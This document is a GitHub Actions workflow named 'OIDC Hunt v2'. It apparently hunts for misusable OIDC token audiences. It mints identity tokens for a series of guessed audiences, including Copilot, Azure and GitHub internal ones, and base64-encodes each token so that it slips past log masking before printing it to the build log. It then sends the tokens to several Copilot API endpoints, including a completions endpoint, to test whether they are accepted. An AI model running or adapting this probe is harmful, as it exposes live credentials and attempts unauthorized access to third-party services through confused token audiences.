name: OIDC Hunt v2
on:
  push:
    paths: ['.github/workflows/oidc-hunt-v2.yml']
permissions:
  id-token: write
  contents: read
jobs:
  hunt:
    runs-on: ubuntu-latest
    steps:
      - name: OIDC audiences fresh tokens
        run: |
          get_token() {
            curl -sf "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=$1" \
              -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" | python3 -c "import sys,json; print(json.load(sys.stdin)['value'])"
          }
          for aud in "api://hosted-compute-ro" "api://AzureADTokenExchange" "api://github-actions-runner" "sigstore" "api://github-copilot" "api://copilot-platform" "https://github.com" "api://github-codeload" "api://github.com"; do
            TOKEN=$(get_token "$aud")
            TOKEN_B64=$(echo "$TOKEN" | base64 -w0)
            echo "AUD_${aud}:${TOKEN_B64}"
          done
      - name: Test copilot-platform token against API
        run: |
          get_token() {
            curl -sf "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=$1" \
              -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" | python3 -c "import sys,json; print(json.load(sys.stdin)['value'])"
          }
          TOKEN=$(get_token "api://copilot-platform")
          echo "=== Testing api.enterprise.githubcopilot.com ==="
          curl -sv "https://api.enterprise.githubcopilot.com/v1/models" \
            -H "Authorization: Bearer $TOKEN" \
            -H "Content-Type: application/json" 2>&1 | tail -30
          echo "=== Testing api.githubcopilot.com ==="  
          curl -sv "https://api.githubcopilot.com/models" \
            -H "Authorization: Bearer $TOKEN" \
            -H "Copilot-Integration-Id: vscode-chat" 2>&1 | tail -20
      - name: Test github-copilot token
        run: |
          get_token() {
            curl -sf "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=$1" \
              -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" | python3 -c "import sys,json; print(json.load(sys.stdin)['value'])"
          }
          TOKEN=$(get_token "api://github-copilot")
          echo "=== Testing with api://github-copilot audience ==="
          curl -sv "https://api.githubcopilot.com/models" \
            -H "Authorization: Bearer $TOKEN" 2>&1 | tail -20
          curl -sv "https://copilot-proxy.githubusercontent.com/v1/engines/copilot-codex/completions" \
            -H "Authorization: Bearer $TOKEN" \
            -H "Content-Type: application/json" \
            -d '{"prompt":"hello","max_tokens":5}' 2>&1 | tail -20
